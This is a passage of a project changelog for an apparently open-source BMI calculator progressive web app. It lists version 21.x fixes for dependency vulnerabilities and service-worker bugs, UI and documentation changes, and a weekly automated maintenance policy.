- **Test suite cleanup** — removed future-roadmap placeholders and duplicate test bloat. _(2a19413)_

### Chore

- Weekly dependency refresh, GitHub Action version self-heal, prettier formatting pass on `+error.svelte`. _(c56b18f, ef385b8, e5297f8, ad9e263)_

---

## [21.6.0] — Stellar-v21.6

### Fixed

- **10 dependency vulnerabilities** — resolved advisories in `undici`, `tar`, and `vite` via `package.json` overrides without breaking the frozen lockfile. _(30d77eb)_
- **esbuild GHSA-gv7w-rqvm-qjhr** — pinned `esbuild` to a patched version. _(78d4f02)_

### Changed

- **Workflow rename** — `auto-update.yml` → `maintenance.yml` for ecosystem consistency. _(2e76156)_
- **Owner contact email** — obfuscated to deter scraping. _(5a7e0eb)_

### Chore

- Three weekly lockfile refreshes via the new maintenance workflow. _(fca70bd, 11dad7e, abce00e)_

---

## [21.5.0] — Stellar-v21.5

### Fixed

- **PWA false-positive update loop** — `v21.5` shipped a regression where the service-worker update detector repeatedly prompted users to refresh. Reworked the version-stability check so first-load false positives no longer fire. _(6280a95)_
- **Storage write ordering** — hardened the localStorage write sequence to prevent partial writes during tab teardown. _(1aa1d8f)_
- **PWA commit compare** — fixed a bug where comparing service-worker commits could miss an update when the byte length was identical but the hash differed. _(1aa1d8f)_
- **BMI null safety** — added explicit null guards in the BMI calculation pipeline to prevent `NaN` propagation when inputs are cleared mid-typing. _(1aa1d8f)_

### Changed

- **CI naming and author identity** — standardized workflow names and commit author identity for the maintenance bot. _(91a38a5)_
- **Security docs tightened** — refined the privacy boundary and scope sections in `SECURITY.md`. _(9e898a3)_

---

## [21.4.0] — Stellar-v21.4

### Changed

- **Rebrand to masters logo** — replaced the legacy `bmi-logo-masters.png` with a new 1254×1254 RGBA master asset, regenerated all derived sizes (128, 180, 192, 216, 256, 512, 512-maskable, 1024), and removed legacy asset files. _(84418e6, dd87777, 87f5dd0, 4005f15, 92667d6)_
- **Touch targets** — improved minimum tap-target sizes across the pager and form controls. _(84418e6)_

### Added

- **Trademark and branding guidelines** — introduced `TRADEMARK.md` and `BRANDING.md` governing name, logo, and color usage. _(0aa47ed, 8ac6387)_

### Chore

- Hardened direct dependency update flow, tightened workflow path filters, simplified `.gitignore`, normalized nightbot maintenance, prettier pass on `furthermore.md`. _(d5a2fed, 3c224e1, 4c0c12c, e245c9d, c7fd036, d76ad8a, afc4ff7, a404ad1)_

---

## [21.3.0] — Stellar-v21.3

### Added

- **Dormant maintenance guide** — introduced `DORMANT.md` as the canonical wake-up checklist for long quiet periods. _(4eed226)_
- **PWA audits hardened** — added `check-pwa-offline-shell.ts` and tightened the offline-shell verification gate. _(b6f9ae6)_

### Changed

- **Direct weekly maintenance** — switched the dependency-update workflow from PR-first to direct-commit (with read-only validation) to reduce friction. _(cc49e3a)_
- **License consolidation** — removed a stray `LICENSE.md` and consolidated on the GPL-3.0 `LICENSE` file. _(6c42435, 6216873)_

### Chore

- Six weekly dependency refreshes, multiple `chore(deps)` bumps. _(47b6b79, 8d2c438, c90cdb0, 4d60e3c, d3e6515, 98d12c8, ab72db0, 04276c8)_
- Misc refactors across utilities. _(8ad6554)_
- README logo alt-text and badges. _(ab72db0, 04276c8)_

---

## [21.2.0] — Stellar-v21.2

### Fixed

- **Mobile viewport edge** — polished layout overflow on small-width viewports. _(054eaa2)_
- **UX consistency cleanup** — visual pass across pager, gauge, and form. _(4108783)_

### Changed

- **Verify script robustness** — improved error reporting in the local verify script. _(ede7f50)_

### Chore

- Dependency update. _(321d13f)_

---

## [21.1.0] — Stellar-v21.1

### Fixed

- **Masterclass UI improvements** — multiple UX/UI consistency passes (v1–v4 iteration cycle). _(183bd03, 0eb237e, 588eb1f, 777e002)_
- **Notes feature** — small fixes for the in-app notes flow. _(222ae5d)_

---

## [21.0.0] — Stellar-v21.0

### Fixed

- **Service worker in dev preview** — fixed a bug where the service worker was incorrectly hooked in `vite dev`. _(62925f4)_
- **Accessibility / i18n / consistency** — critical pass on focus-visible contracts, universal unit symbols, removal of dead props, and documentation sync. _(31ca18b)_
- **ESLint formatting** — fixed formatting violations flagged by ESLint. _(46cdf7c)_
- **Twelve UX/UI consistency iterations** — comprehensive visual polish across all sections (v1 through v12). _(793412e, da9f1b3, 1cfdb30, eec297d, 0961987, da9f1b3, 06b1de8, 22c74fe)_

### Changed

- **Documentation masterclass rewrite** — rewrote all 5 core documentation files (README, BRANDING, SECURITY, TRADEMARK, furthermore) for accuracy and tone. _(4dfd3ec, bf622cd, bc72a10)_

### Chore

- Dependency update. _(508ed8f, 0299db1)_

---

## Maintenance Policy

This project follows a low-touch maintenance cadence. Between minor releases, automated workflows handle:

- **Weekly lockfile refresh** — `.github/workflows/maintenance.yml` runs `bun update --lockfile-only` every Monday 00:00 UTC, validates the result against the full CI gate, then commits directly to `main`.
- **Daily security audit** — `.github/workflows/security-audit.yml` runs `bun audit` + policy checks at 00:00 UTC.
- **GitHub Action self-heal** — `.github/workflows/self-heal-actions.yml` bumps action versions on patch/minor releases.

When waking the project after a dormant period, expect `bun audit` to flag advisories that were published in the interim — bump `overrides` in `package.json` (never weaken crypto deps) and re-run `./scripts/build.sh check-all`. Full guidance: [`DORMANT.md`](DORMANT.md).

---

_Link mapping: `[21.x.0]` sections correspond to the historic `Stellar-v21.x` tags; sections from the `v*` tag era onward match `package.json` directly. Commits referenced by short SHA can be inspected via `git show <sha>`._
